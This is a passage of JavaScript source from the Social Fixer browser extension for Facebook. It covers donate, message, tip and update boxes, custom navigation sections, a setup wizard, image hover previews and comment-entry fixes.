																		options.set(input.name,input.value,false);
																	}
																});
															}
															if (typeof data.setpref!="undefined" || data.saveprefs) {
																options.save();
															}
															if (data.message) {
																alert(data.message);
															}
															if (data.close) {
																setTimeout(function(){removeChild( $('pagelet_'+pagelet_id) );},200);
															}
															if (typeof data.stopPropagation=="boolean") {
																stopPropagation = data.stopPropagation;
															}
															if (typeof data.preventDefault=="boolean") {
																preventDefault = data.preventDefault;
															}
														}
														catch(e) {
															add_exception(e);
														}
													}
													else {
													}
												}
												else {
												}
												if (stopPropagation && e.stopPropagation) { e.stopPropagation(); }
												if (preventDefault && e.preventDefault) { e.preventDefault(); }
											} catch(e) { add_exception(e); }
										});
									});
								} catch(e) { add_exception(e); }
								return section;
							}
							
							// Reusable functions to check the cache for content, or retrieve it from the config
							// ---------------------------------------------------------------------------------
							var get_content = function(key,ignore_cache,ttl,func) {
								// Use cached content if available
								var cache_key = userid+'/cached_content/'+key+'_pagelet';
								if (ignore_cache) {
									setValue(cache_key,'');
									get_config_data(key,function(content) {
										if (content) {
											var expires = time()+ttl;
											setValue(cache_key, JSON.stringify( {"expires_on":expires,"content":content} ) );
											func(content);
										}
									},null,true);
								}
								else {
									getValue(cache_key,{},function(data) {
										// Stored data will be JSON
										try {
											var json = parse(data);
											if (time() < +json.expires_on) {
												return func(json.content);
											}
											setValue(cache_key,'');
										} catch(e) { }
										get_config_data(key,function(content) {
											if (content) {
												var expires = time()+ttl;
												setValue(cache_key, JSON.stringify( {"expires_on":expires,"content":content} ) );
												func(content);
											}
										});
									});	
								}
							};

							// Insert a "Donate" box on the right every so often
							// -------------------------------------------------
							var sfx_donate_check_time = options.get('sfx_donate_check_time2');
							var show_donate = true;
							log("[donate]","sfx_donate_check_time",sfx_donate_check_time);
							log("[donate]","time()",time());
							log("[donate]","diff",time()-sfx_donate_check_time);
							log("[donate]","sfx_no_donate2",options.get('sfx_no_donate2'));
							log("[donate]","sfx_donated",options.get('sfx_donated'));
							if (!sfx_donate_check_time || sfx_donate_check_time==0) {
								log("[donate]","Donate check time does not exist");
								sfx_donate_check_time = time() + (1*weeks);
								options.set('sfx_donate_check_time2',sfx_donate_check_time);
								show_donate = false;
							}
							if (!options.get('sfx_no_donate2') && !options.get('sfx_donated') && show_donate && (sfx_donate_check_time>0) && (time() > sfx_donate_check_time)) {
								log("[donate]","Loading donate content");
								// Get the content (perhaps cached) and display it
								get_content('donate',false,(1*weeks),function(content) {
									log("[donate]","Got donate content",content);
									var c = pagelet_box(feed_right_column,'bfb_donate_pagelet','Support Social Fixer!',content);
									click(QS(c,'.bfb_pagelet_button_next_month'),function() {
										options.set('sfx_donate_check_time2',time()+(30*days) );
										setTimeout(function(){removeChild(c);},200);
									},false);
								});
							}
							else {
								log("[donate]","not showing donate message");
							}
							
							// Check for new SFX Messages
							// --------------------------
							if (options.get('check_for_messages2')) {
								var t = time();
								var message_check_interval = options.get('message_check_interval2');
								var show_message = options.get('show_message');
								var min_since_last_check = (t-options.get('last_message_check'))/ (1000*60);
								var invalidate_cache = false;
								log("[messages]",'message_check_interval',message_check_interval);
								log("[messages]",'show_message',show_message);
								log("[messages]",'last_message_check',options.get('last_message_check'));
								log("[messages]",'min_since_last_check',min_since_last_check);
								if (options.get('last_message_check')==0) {
									log("[messages]","Initial install, waiting 1 day to check for messages");
									// Initial install, wait 1 day
									options.set('last_message_check',time()+(1*days), false);
									options.set('show_message',false,false);
									options.save();
									show_message = false;
								}
								else if (show_message || (min_since_last_check > message_check_interval)) {
									var last_message_id = +options.get('last_message_id');
									log("[messages]",'last_message_id',last_message_id);
									if (min_since_last_check > message_check_interval) {
										options.set('last_message_check',time(),false);
										options.set('show_message',true,false);
										options.save();
										invalidate_cache = true;
									}
									log("[messages]",'invalidate_cache',invalidate_cache);
									// Get the content (perhaps cached) and display it
									get_content('messages',invalidate_cache,(1*weeks),function(message_list) {
										// Loop through the messages to find the first one to display
										for (var i=0;i<message_list.length; i++) {
											var m = message_list[i];
											if (m && m.id && m.id>0 && m.id>last_message_id) {
												// Found a message to display
												var c = pagelet_box(feed_right_column,'bfb_message_pagelet','Social Fixer Message',m.content);
												click(QS(c,'.bfb_button_close'),function() {
													options.set('last_message_check',time(),false);
													options.set('last_message_id',last_message_id,false);
													options.set('show_message',false,false);
													options.save();
													setTimeout(function(){removeChild(c);},200);
												},false);
											}
										}
									});
								}
								else {
									log("[messages]","Not checking for messages");
								}
							}
						
							// Tips of the Day
							// ---------------
							if (options.get('tips_of_the_day')) {
								var t = time();
								var tip_check_interval = 1*days;
								var tip_show_after = options.get('tips_show_after');
								log("[tips]",'tip_show_after',tip_show_after);
								var tip_last_id = options.get('tips_last_id');
								log("[tips]",'tip_last_id',tip_last_id);
								var ignore_cache = (tip_show_after<=1);
								// Don't show tips until 24 hours after install
								if (!tip_show_after || tip_show_after==0) {
									log("[tips]",'Waiting 24 hours to show the first tip');
									options.set('tip_show_after',time() + (1*days) );
								}
								// Otherwise, make sure we've gone past the time checkpoint before showing
								else if (time() > tip_show_after) {
									// Get the content (perhaps cached) and display it
									get_content('tips',ignore_cache,(1*weeks),function(tips) {
										if (!tips || !tips.length) { return; }
										log("[tips]",'Found '+tips.length+' tips');
										// Loop through the messages to find the first one to display
										for (var i=0;i<tips.length; i++) {
											var tip = tips[i];
											if (tip && tip.id && tip.id>tip_last_id) {
												log("[tips]",'Found tip #'+tip.id+' to display');
												// Found a tip to display
												var close_options = {'close_pref':'tips_of_the_day', 'close_msg':'Are you sure you want to close and no longer see any Social Fixer Tips of the Day? If you only want to hide this tip, click the Close button instead!'};
												var c = pagelet_box(feed_right_column,'bfb_tip_pagelet','Social Fixer Tip of the Day (#'+(i+1)+' of '+tips.length+')',tip.content,close_options);
												click(QS(c,'.bfb_tip_close'),function() {
													log("[tips]",'Close clicked');
													options.set('tips_show_after',time()+(1*days),false);
													options.set('tips_last_id',tip.id,false);
													options.save( function(){removeChild(c); } );
												},false);
												break;
											}
										}
									});
								}
								else {
									log("[tips]",'Waiting longer to show the next tip');
								}
							}
							
							
							// For update checking
							if (SCRIPT_TYPE!="chrome_gallery" && options.get('check_for_updates2')) {
								var t = time();
								var update_check_interval = (options.get('update_check_interval2') * hours) || (8*hours);
								log("[update]","update_check_interval",update_check_interval);
								var update_show_after = options.get('update_show_after');
								log("[update]","update_show_after",update_show_after);
								log("[update]","time()=",time());
								var version_ack = options.get('version_ack') || 0;
								log("[update]","version_ack",version_ack);

								// If we've never checked, wait an hour to check
								if (!update_show_after) {
									log("[update]","Never checked - waiting until ",time()+(1*days));
										options.set('update_show_after',time()+(1*days));
								}
								// If it's past the time to check, then check!
								else if (time() > update_show_after) {
									get_content('update',true,update_check_interval,function(update) {
										log("[update]","Received content",update);
										// If it's newer than our current version, and the one we've acknowledged before, show it
										if (update && update.version && update.version>version_ack && update.version>version) {
											var url = null;
											if (SCRIPT_TYPE=="greasemonkey") {url="http://SocialFixer.com/socialfixer.user.js";}
											if (SCRIPT_TYPE=="opera") {url="http://SocialFixer.com/socialfixer.oex";}
											if (SCRIPT_TYPE=="chrome") {url="http://SocialFixer.com/socialfixer.crx";}
											if (SCRIPT_TYPE=="chrome_gallery") {url="https://chrome.google.com/webstore/detail/ifmhoabcaeehkljcfclfiieohkohdgbb";}
											if (SCRIPT_TYPE=="safari") {url="http://SocialFixer.com/socialfixer.safariextz";}
											if (SCRIPT_TYPE=="firefox_addon") {url="http://SocialFixer.com/socialfixer.xpi";}
											log("[update]","Need to show update!");
											var close_options = {'close_pref':'check_for_updates2', 'close_msg':'Are you sure you want to close this message and NOT get notifications of updates? This is NOT recommended! You may end up using an old version of Social Fixer that stops working correctly as Facebook changes!'};
											var c = pagelet_box(feed_right_column,'bfb_update_pagelet','<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAACXBIWXMAAC4jAAAuIwF4pT92AAABk0lEQVR4nGOU1%2FOX1nRjZGJmIAT%2B%2F%2Fv79PouRqvwqVhVqymIeNqpyUsJ%2Fvn77%2BKN56t3XP71%2B%2B%2F%2Ff39ZsKo20JCcWOPLzMTIwMDw9fuvN%2B%2B%2FCglwvXj9mZGJmQWr7b5OmhDVM1acXLPzyo%2Bff%2BBSTJiqGRkZzfVkIOwfP%2F8gq8auQU1BWICPE8L2sleHMIT4OQ01pRgYGLA4yc5UEdnroR66hlpSVoZy%2B47fPX%2F9GboGDnYWHwcNZJH8OCsGBobfv%2F%2Bu2nEZi5PyYq2EBbgwre2Zf%2BTGvdcoGhgZGfJirfycNOEiD5%2B%2Bv3D9OQMDw%2Fx1Z7ceuAERhDqJiZGxJNkWrvranVfTl588f%2F2ZpChvfIDR3DVnEOZaR85gZmaqSndwt1GFCG0%2FdKtj9sG%2Ff%2F9hOoyBgYGFlYW5PsfZwQwaMvtP3mufdeDfv%2F9YVTMwMDAeO%2F%2FQ0kAOwjl58XFF747ff7CbDdXw69cvVlZWBgaGSzdfFHVsRYtXNPD%2F319mNjY2S0vLu4%2FfF3Vs%2FfbjN37VT6%2FvAgBCAZWFYGLeVgAAAABJRU5ErkJggg%3D%3D">&nbsp;Social Fixer Update Available!',update.content,close_options);
											QS(c,'.sfx_install_update',function(a) {
												a.href = url;
											});
											click(QS(c,'.sfx_install_update'),function() {
												options.set('update_show_after',time()+(1*days),false);
												options.set('version_ack',update.version);
												options.save();
												window.open('http://socialfixer.com/blog/category/releasenotes/');
												setTimeout(function(){removeChild(c);},200);
											},false);
											click(QS(c,'.sfx_install_tomorrow'),function() {
												options.set('update_show_after',time()+(1*days),false);
												options.set('version_ack',update.version);
												options.save();
												setTimeout(function(){removeChild(c);},200);
											},false);
											html(QS(c,'.bfb_current_version'),version);
										}
										// Otherwise don't check again for a while
										else {
											log("[update]","Nothing new found - waiting until next update interval");
											options.set('update_show_after',time()+update_check_interval);
										}
									});
								}
								else {
									log("[update]","Nothing to do");
								}
							}
									
							
						});

						// LEFT COLUMN CONTENT
						// ===================
						// This content is dependent on the "type-ahead" content being loaded, so do that right away
						function attachLeftColumnContent() {
							var connections;
							
							var createNavSection = function(nav,id,title,type,allowedit,sortprop,processfunc,imgclass) {
								if ($('bfb_nav_'+id)==null) {
									var open = options.get(id+'_default_open');
									if (typeof open=="undefined" || open==null) {
										open = true;
									}
									var position = +options.get(id+'_position') || 2;
									var max_height = options.get(id+'_max_height') || 5000;
									var h4 = el('h4',null,null,null,title);
									h4.id = "bfb_nav_title_"+id;
									bind(h4,'click',function() { toggle('bfb_nav_content_'+id,id+'_default_open'); });
									h4.style.cursor = "pointer";
									var d = el('div','clearfix uiHeader uiHeaderNav uiHeaderTopBorder');
									html(d,_template('<div id="bfb_nav_%1%" class="lfloat"></div><div class="rfloat" id="bfb_nav_rfloat_%1%"></div><ul class="uiSideNav uiSideNavSection uiFutureSideNavSection bfb_uiSideNav" id="bfb_nav_content_%1%" style="max-height:%4%px;overflow-y:auto;overflow-x:hidden !important;%3%"></ul>',id,title,(open?"":"display:none;"),max_height ));
									append(d.firstChild,h4);
									insertAtPosition(nav,d,position);
									if (allowedit) {
										var rfloat = $('bfb_nav_rfloat_'+id);
										if (rfloat) {
											var a_id = 'bfb_nav_edit_'+id;
											var a = el('a',null,{id:a_id},{click:function(e){editNavSection(e,id,type,sortprop,processfunc,imgclass);}});
											html(a,'edit');
											append(rfloat,a);
										}
									}
									return $('bfb_nav_content_'+id);
								}
							};
							
							var getConnectionsByType = function(type,sorted,sortprop) {
								var list = [];
								sortprop = sortprop || "text";
								for (var i=0; i<connections.length; i++) {
									var c = connections[i];
									if (c && c.type && c.type==type) { list.push(c); }
								}
								if (sorted) {
									list = list.sort( function(a,b) { if (a&& typeof a[sortprop]!="undefined" &&a[sortprop].toLowerCase){a=a[sortprop].toLowerCase();} if (b&&b[sortprop]&&b[sortprop].toLowerCase){b=b[sortprop].toLowerCase();} return (a>b)?1:-1; } );
								}
								return list;
							};
							
							var imgClassCache = {};
							var createNavLink = function(title,url,imgsrc,imgclass,target,count,count_id) {
								var img='', hasimg=false;
								if (imgclass) {
									if (typeof imgClassCache[imgclass]!="undefined") {
										imgclass = imgClassCache[imgclass];
									}
									else if (document.querySelectorAll) {
										// imgclass will now be the id of an element on the page whose icon we will steal by matching class names
										var i = document.querySelectorAll('#'+imgclass+' span.imgWrap i');
										if (i && i.length) {
											imgClassCache[imgclass] = i[0].className;
											imgclass = i[0].className;
										}
									}
									img = '<span class="imgWrap"><i class="'+imgclass+'"></i></span>';
									hasimg = true;
								}
								else if (imgsrc) {
									img = '<span class="imgWrap"><img src="'+imgsrc+'" height=16 width=16></span>';
									hasimg = true;
								}
								count = (typeof count!="undefined")?'<span class="count blue-bubble-float-right uiSideNavCount"><span class="countValue fss" id="'+(count_id?count_id:'')+'">'+count+'</span><span class="maxCountIndicator"></span></span>':'';
								return _template('<a class="item %5%" title="%7%" href="%2%" target="%4%">%6%<div class="clearfix">%1%<span class="linkWrap">%3%</span></div></a>',img,url,title,target,hasimg?"":"noimg",count,htmlescape(title) );
							};
							
							var createNavListItem = function(title,url,imgsrc,imgclass,target,count,count_id) {
								return "<li class=\"sideNavItem\">"+createNavLink(title,url,imgsrc,imgclass,target,count,count_id)+"</li>";
							};
							
							var createConnectionSection = function(nav,type,id,title,allowedit,sortprop,processfunc,imgclass) {
								var target = options.get(id+'_new_window')?"_blank":"";
								var content = createNavSection(nav,id,title,type,allowedit,sortprop,processfunc,imgclass);
								if (content) {
									var count = populateConnectionSection(content,id,type,sortprop,processfunc,imgclass);
									var h4 = $('bfb_nav_title_'+id);
									if (h4) { appendhtml(h4,' <span id="bfb_nav_count_'+id+'" class="countValue">('+count+')</span>'); }
								}
							};
							
							var populateConnectionSection = function(container,id,type,sortprop,processfunc,imgclass) {
								var h = "";
								var target = options.get(id+'_new_window')?"_blank":"";
								var items = getConnectionsByType(type,true,sortprop);
								var hidden_connections = options.get('hidden_connections') || {};
								var count = 0;
								if (processfunc) {
									ret = processfunc(items);
									h += ret.html;
									count = ret.count;
								}
								else {
									for (var j=0; j<items.length; j++) {
										var item = items[j], url = item.path;
										if (!hidden_connections || !hidden_connections[type] || !hidden_connections[type][item.uid]) {
											if (item.text) {
												count++;
												h += createNavListItem(item.text,url,item.photo,imgclass,target);
											}
										}
									}
								}
								html( container, h );
								return count;
							};
							
							var editNavSection = function(e,id,type,sortprop,processfunc,imgclass) {
								var edit_link = $('bfb_nav_edit_'+id);
								var content = $('bfb_nav_content_'+id);
								var hidden_connections = options.get('hidden_connections') || {};
								if (typeof hidden_connections[type]=="undefined") {
									hidden_connections[type] = {};
								}
								
								if (edit_link.innerHTML == 'edit') {
									html( edit_link, 'save' );
									edit_link.style.backgroundColor = 'yellow';
									
									html( content, "" );
									var items = getConnectionsByType(type,true,sortprop);
									for (var j=0; j<items.length; j++) {
										var item = items[j];
										if (item.text) {
											var hidden = !!hidden_connections[type][item.uid];
											var input = el('input',null,{type:'checkbox',value:item.uid,'checked':!hidden},{click:function(){
												hidden_connections[type][this.value] = !this.checked;
												options.set('hidden_connections',hidden_connections);
											}});
											var div = el('div',null);
											html(div,item.text);
											insertFirst(div,input);
											append(content,div);
										}
									}
								}
								else if (edit_link.innerHTML == 'save') {
									html( edit_link, 'edit' );
									edit_link.style.backgroundColor = '';
									options.save();
									var count = populateConnectionSection(content,id,type,sortprop,processfunc,imgclass);
									var count_span = $('bfb_nav_count_'+id);
									if (count_span) {
										html( count_span, "("+count+")" );
									}
								}
								
							};

							// Only insert left nav sections on the home screen
							if (!QS(document,'body.home')) { return; }
							
							// Insert some new navigation links
							onIdLoad('leftCol',function(nav) {
								try {
									var container = QS(nav,'.uiSideNav');
									if (container) {
										if (options.get('show_nav_all_connections')) {
											append(container, el('li','sideNavItem stat_elem',null,null,createNavLink('All Connections','/friends/?filter=ac',null,'navItem_ff','')) );
										}
										if (options.get('show_nav_unblock_applications')) {
											append(container, el('li','sideNavItem stat_elem',null,null,createNavLink('Unblock Applications','/settings?tab=blocking',null,'navItem_apps','')) );
										}
									}
								}
								catch (e) { add_exception(e); }
							});
							
							get_remote_content('typeahead_new',function(response) {
								try {
									if (response) {
										var json = parse(response.replace(/for\s*\(\s*\;\s*\;\s*\)\s*\;/,''),"Typeahead content");
										if (json.payload) {
											connections = json.payload.entries;
										}
										else { 
											connections = null;
											return false;
										}
										if (connections) {
											onIdLoad('leftCol',function(nav) {
												// The new left nav sections need to be inserted in the ascending order of their positions
												var sections = [];
												if (options.get('show_my_pages')) { sections[+options.get('my_pages_position')||99] = function() { createConnectionSection(nav,'page','my_pages','My Pages',true); }; }
												if (options.get('show_my_events')) { sections[+options.get('my_events_position')||99] = function() { createConnectionSection(nav,'event','my_events','My Events',true,null,null); };}
												if (options.get('show_my_groups')) { sections[+options.get('my_groups_position')||99] = function() { createConnectionSection(nav,'group','my_groups','My Groups',true,null,null); };}
												if (options.get('show_my_apps')) { sections[+options.get('my_apps_position')||99] = function() { createConnectionSection(nav,'aapp','my_apps','My Apps',true,null,null,'navItem_apps'); };}
												// Now run through the array of functions created to run them in order
												for (var i=0; i<sections.length; i++) {
													if (sections[i]) { sections[i](); }
												}
											});
										}
									}
								} catch (e) { add_exception(e); }
							});
						}
						try { attachLeftColumnContent(); } catch(e) { add_exception(e); }

						// ========================================================
						// Version/Update/Wizard Checks
						// ========================================================
						function show_wizard(stored_version,current_version,upgrade) {
							
							log("[wizard]","show_wizard",stored_version,current_version,upgrade);
							// Retrieve the data
							get_config_data('wizard',function(data) {
								var all_steps = data.steps, steps=[];
								// Loop through the available steps to find the ones we want
								if (all_steps.length>0) {
									for (var i=0; i<all_steps.length; i++) {
										var step = all_steps[i];
										if ((!upgrade && step.type=="install") || (upgrade && step.type=="update")) {
											if (step.version==0 || (step.version>stored_version && step.version<=current_version)) {
												steps.push(step);
											}
											else {
												log("[wizard]","Ignored step #"+i+" with version "+step.version);
											}
										}
									}
								}
								log("[wizard]","found "+steps.length+" steps");
								if (steps.length>0) { // Intro step + "done" step are required
									(function() {
										var total_steps = steps.length;
										var current_step = 1;
										var current_dialog = null;
										var show_step = function(step_number) {
											var step_data = steps[step_number-1];
											var content = step_data.content;
											if (options) {
												options.options.forEach(function(opt,i) {
													if (opt.name) {
														content = content.replace( new RegExp("%"+opt.name+"%","g"), options.renderOption(opt));
													}
												});
											}
											var save_wizard_prefs = function() {
												var inputs = current_dialog.querySelectorAll('input');
												for (var i=0; i<inputs.length; i++) {
													var e = inputs[i];
													if (e.name) {
														if (e.type=="checkbox") { options.set(e.name,e.checked,false); }
														else if (e.type=='text') { options.set(e.name,e.value,false); }
														}
												}
											}
											var next_button = function() {
												save_wizard_prefs();
												options.save();
												removeChild(getParentByClass(this,'bfb_dialog'));
												show_step(++current_step); 
											}
											var back_button = function() {
												save_wizard_prefs();
												options.save();
												removeChild(getParentByClass(this,'bfb_dialog'));
												show_step(--current_step); 
											}
											var done_button = function() {
												save_wizard_prefs();
												options.set('version',version,false);
												options.save(function() {
													try { window.location.reload(true); } catch(e){}
												});
											}
											var cancel_button = function() {
												if (confirm('Cancel Wizard?\n(You can run this again using the link in Options)')) {
													removeChild(getParentByClass(this,'bfb_dialog'));
													options.set('version',version);
												}
											}
											var footer = el('div');
											if (current_step>1) { append(footer,button( '<-- Back',back_button,'better_fb_close')); }
											append(footer,button( 'Cancel',cancel_button,'better_fb_close'));
											if (current_step<total_steps) { append(footer,button( 'Next -->',next_button,'better_fb_close')); }
											else { append(footer,button( 'Done',done_button,'better_fb_close')); }
											current_dialog = show_dialog(content,"Social Fixer "+((stored_version>0 && stored_version<version)?"Update":"Setup")+" Wizard ("+(step_number)+" of "+(total_steps)+")",null,null,footer);
										};
										show_step(current_step);
									})();
								}
								else {
									options.set('version',version);
								}
							},null,true);
						}
						guided_setup_action = function() { show_wizard(0,version,false); }
						var installed_version = options.get("version");
						log("[wizard]",'installed_version',installed_version);
						// If updated, force a clear of the cache
						if (installed_version<version && ls && ls.clear) {
							ls.clear(false);
						}
						if (installed_version==0) {
							show_wizard(0,version,false);
						}
						else if (options.get('show_version_changes') && installed_version<version) {
							// Display a message if the user has upgraded to the latest version
							show_wizard(installed_version,version,true);
						}

						function better_fb_options(tab_id) {
							options.displayOptions(tab_id);
						}

						// ==================================================================
						// Fix the "Home" links so they go to /
						// ==================================================================
						if (options.get('fix_logo2')) { 
							document.addEventListener('click', function(e){ 
								var t = target(e);
								if ( (t.parentNode && "pageLogo"==t.parentNode.id) || (t.accessKey=="1") || (t.parentNode && t.parentNode.parentNode && "navItem_nf"==t.parentNode.parentNode.id) ) { 
									if (typeof e.button=="undefined" || e.button==0) {
										e.stopPropagation(); e.preventDefault(); 
										var url = options.get('home_url');
										if (url=="/" && window_href.indexOf("apps.")>-1) {
											url = protocol+"//www.facebook.com";
										}
										window.location.href=url; 
									}
								} 
							}, true);
						}

						// ==================================================================
						// Change CHAT images to NAME
						// ==================================================================
						if (options.get('chat_images_to_names')) {
							watchDOMNodeInserted('.conversation .profileLink img, .fbChatMessageGroup .img',function(img) {
								var name=img.alt || img.title;
								if (name) {
									img.style.display='none';
									img.parentNode.style.cssFloat = 'none';
									insertAfter(el('div','bfb_chat_name',null,null,name),img);
								}
							});
							onSelectorLoad('.uiFacepileItem',function(fp) {
								if (getParentByClass(fp,'fbFriendsOnlineFacepile')==null) { return; }
								QSA(fp,'a',function(friend) {
									var name = QS(friend,'span.uiTooltipText','innerHTML');
									if (name) {
										html(friend,name);
										friend.style.display="block";
										friend.parentNode.style.cssFloat = 'none';
										if (hasClass(fp,'chatIdle')) {
											friend.style.fontStyle="italic";
											friend.style.color="#627AAD";
										}
									}
								});
							});
						}

						// ========================================================
						// Image Hover Previews
						// ========================================================
						if (options.get('show_image_previews')) {
							var image_preview = null;
							var img_image_preview = null;
							var image_preview_loading = null;
							var image_preview_link = null;
							var image_preview_target = null;
							var image_preview_caption = null;
							var image_preview_delay = +(options.get('image_preview_delay')||0) * 1000;
							var showing_preview = false;
							var image_preview_click = function(){ 
								if (image_preview_link) {
									try{ window.location.href=image_preview_link; }
									catch(e){}
								}
							};
							var last_preview_src = null;
							var capture = true;
							var hide_preview = function() {
									if (image_preview!=null) {
										image_preview.style.display="none";
									}
									image_preview_target = null;
									showing_preview = false;
							};

							var default_position = options.get('image_preview_position');
							var show_footnote = options.get('image_preview_show_footnote');
							bind(document,'keydown',function(e) { 
								if(e.keyCode==27) { hide_preview(); } 
								if (image_preview!=null && showing_preview) {
									// Allow arrow keys to move the preview window
									var pos = image_preview.getAttribute('position');
									if (!pos) { pos="topright"; }
									var newpos = null;
									if(e.keyCode==37) { // Left
										if (pos=="topright") { newpos = "topleft"; }
										if (pos=="bottomright") { newpos = "bottomleft"; }
									}
									else if (e.keyCode==38) { // Up
										if (pos=="bottomright") { newpos = "topright"; }
										if (pos=="bottomleft") { newpos = "topleft"; }
									}
									else if (e.keyCode==39) { // Right
										if (pos=="topleft") { newpos = "topright"; }
										if (pos=="bottomleft") { newpos = "bottomright"; }
									}
									else if (e.keyCode==40) { //Down
										if (pos=="topright") { newpos = "bottomright"; }
										if (pos=="topleft") { newpos = "bottomleft"; }
									}
									if (newpos) {
										image_preview.setAttribute('position',newpos);
										options.set('image_preview_position',newpos,false);
										options.set('image_preview_show_footnote',false,false);
										options.save();
										cancel_bubble(e);
										prevent_default(e);
									}
								}
							})
							bind(document,'mouseover',function(e) {
								image_preview_target = target(e);
								var delayed_image_preview_target = image_preview_target;
								var tn = image_preview_target.tagName;
								var src = null;
								if (tn && (tn=="IMG" || tn=="I" || tn=="A") ||tn=="DIV") {
									// Skip photos in cover selector
									if (parent(image_preview_target,'.fbProfileCoverDialog')) { return; }
									if (hasClass(image_preview_target,'draggingPhoto')) { return; } // Don't show preview when repositioning photos
									if (tn=="A" || tn=="DIV") {
										if (hasClass(image_preview_target,'uiPhotoThumb') || hasClass(image_preview_target,'photoWrap')) {
											delayed_image_preview_target = image_preview_target = QS(image_preview_target,'img');
											if (!image_preview_target) { return; }
											tn="IMG";
										}
										else { hide_preview(); return; }
									}

									var src=null;
									var preview_src = null;
									if (tn=="IMG") {
										src = image_preview_target.src;
									}
									if (image_preview_target.style && image_preview_target.style.backgroundImage && (tn=="I" || (tn=="IMG" && /safe_image/.test(image_preview_target.style.backgroundImage)))) {
										src = image_preview_target.style.backgroundImage.replace(/^\s*url\s*\(\s*['"]?/,'').replace(/(\.jpg)['"]?.*$/,'$1');
									}
									if (/c\d+\.\d+\.\d+\.\d+\/p403x403/.test(src)) {
										preview_src = src.replace(/c\d+\.\d+\.\d+\.\d+\/p403x403/,"s720x720");
									}
									else if (/c\d+\.\d+\.\d+\.\d+\/p133x133/.test(src)) {
										preview_src = src.replace(/c\d+\.\d+\.\d+\.\d+\/p133x133/,"s720x720");
									}
									else if (/c\d+\.\d+\.\d+\.\d+\/s\d+x\d+(.*?)\_s.jpg/.test(src)) {
										preview_src = src.replace(/c\d+\.\d+\.\d+\.\d+\/s\d+x\d+(.*?)\_s.jpg/,"s720x720$1_n.jpg");
									}
									else if (/s320x320/.test(src)) {
										preview_src = src.replace(/s320x320/,"s720x720");
									}
									else if (/s480x480/.test(src)) {
										preview_src = src.replace(/s480x480/,"s720x720");
									}
									else if (/[ps][^7]\d\dx\d\d\d/.test(src)) {
										preview_src = src.replace(/[ps][^7]\d\dx\d\d\d/,"s720x720");
									}
									else if (/\d+\/[aqts][\d_]+\.jpg/.test(src)) {
										preview_src = src.replace(/(\d+)\/[asqt]([\d_]+\.jpg)/,"$1/n$2");
									}
									else if (/\d+_([asqt])\.jpg/.test(src)) {
										preview_src = src.replace(/(\d+)_([astq])\.jpg/,"$1_n.jpg");
									}
									else if (/safe_image.php/.test(src)) {
										preview_src = url_param(src,"url").replace(/\+/g,' ');
									}
									else if (/app_full_proxy.php/.test(src)) {
										preview_src = url_param(src,"src");
									}
									else if (hasClass(image_preview_target.parentNode,'uiScaledImageContainer') || hasClass(image_preview_target.parentNode,'tickerFullPhoto')) {
										preview_src = src;
									}
									if (preview_src) {
										setTimeout(function() {
											if (delayed_image_preview_target!=image_preview_target) { return; }
											var pa = getParentByTag(image_preview_target,"a");
											if (pa && pa.href && pa.href!="#") {
												image_preview_link = pa.href;
												var image_preview_caption_text = pa.title || "";
											}
											else {
												image_preview_link = null;
											}
											if (!image_preview) {
												image_preview = el('div','bfb_image_preview');
												image_preview.setAttribute('position',default_position);
												image_preview_loading = el('div','bfb_image_preview_msg',null,null,'Loading preview...');
												append(image_preview,image_preview_loading);
												img_image_preview = el('img','bfb_image_preview_img',{'src':preview_src});
												img_image_preview.style.maxHeight = (window.innerHeight-100)+"px";
												img_image_preview.style.display="none";
												bind(img_image_preview,'load',function(){image_preview_loading.style.display="none";img_image_preview.style.display="block";showing_preview=true;});
												bind(img_image_preview,'click',image_preview_click);
												append(image_preview,img_image_preview);
												if (show_footnote) {
													append(image_preview,el('div','bfb_image_preview_footnote',null,null,'Use &larr; &rarr; &darr; &uarr; to position preview'));
												}
												append(document.body,image_preview);
												last_preview_src = preview_src;
											}
											else {
												img_image_preview.style.maxHeight = (window.innerHeight-100)+"px";
												image_preview.style.display="block";
												showing_preview=true;
												if (preview_src!=last_preview_src) {
													image_preview_loading.style.display="block";
													img_image_preview.style.display="none";
													img_image_preview.src = preview_src;
												}
												last_preview_src=preview_src;
											}
											if (image_preview_link) {
												image_preview.title="Click to go to Image";
												image_preview.style.cursor = "pointer";
											}
											else {
												image_preview.title="";
												image_preview.style.cursor = "";
											}
										},image_preview_delay);
									}
								}
								else if (image_preview_target!=image_preview && image_preview_target!=img_image_preview) {
									hide_preview();
								}
							},capture);
						}
						
						// ========================================================
						// Fix Comments
						// ========================================================
						if (options.get('fix_comments')) {

							// Old Fix
							onSelectorLoad('textarea.enter_submit',function(ta) {
								if (!parent(ta,'.tickerDialogContent') && !parent(ta,'.uiContextualDialog')) {
									removeClass(ta,'enter_submit');
								}
							},'both');

							// New Fix
							(function() {
								var tab_pressed = false;
								var default_text = "Tab &gt; Enter to Submit Comment";
								var ready_to_submit_text = "Press Enter To Submit Comment!";
								bind(document,'keydown',function(e) { 
									var t = target(e);
									if (t && t.tagName && t.tagName=="TEXTAREA" && t.name && t.name=="add_comment_text_text") {
										var button = null;
										var container = parent(t,'.textBoxContainer');
										if (container) {
											var note_container = container.parentNode;
											button = QS(note_container,'.sfx_comment_button');
											if (!button) {
												button = el('div','sfx_comment_button',null,{'click':function(){alert("Social Fixer Message: You must press Tab then Enter to submit a comment, not click the button. I know this is not ideal, but right now it's the only way I can figure out to restore the Enter=Newline functionality. I'm still working on it. If you don't like Tab>Enter, you can disable it in Options.");if(t&&t.focus){t.focus();}}},default_text);
												append(note_container,button);
											}
										}
										if (button) {
											if (e.keyCode==13 && !tab_pressed) {
												// Enter was pressed, just accept it. Don't let Facebook process it.
												cancel_bubble(e);
												
											} 
											if (e.keyCode==9) { // TAB
												tab_pressed = true;
												prevent_default(e); // Don't tab out of the field
												cancel_bubble(e);
												html(button,ready_to_submit_text);
											}
											else if (tab_pressed) {
												tab_pressed = false;
												html(button,default_text);
											}
										}
									}
								},true);
							})();
							onDOMContentLoaded(function() {
								add_style('.sfx_comment_button { float:right; padding:4px 8px ; margin:4px; background-color:#5A74A8 !important; border:1px solid #1A356E; color:white; font-weight:bold; font-size:12px !important; line-height:12px !important;  } ');
							});

						}
						
						// ========================================================
						// Reply To Comments
						// ========================================================
						if (options.get('comment_reply')) {
							(function() {
								var float_textarea = options.get('comment_reply_float_textarea');
								var first_name_only = options.get('comment_reply_first_name_only');
								var tag = options.get('comment_reply_tag');

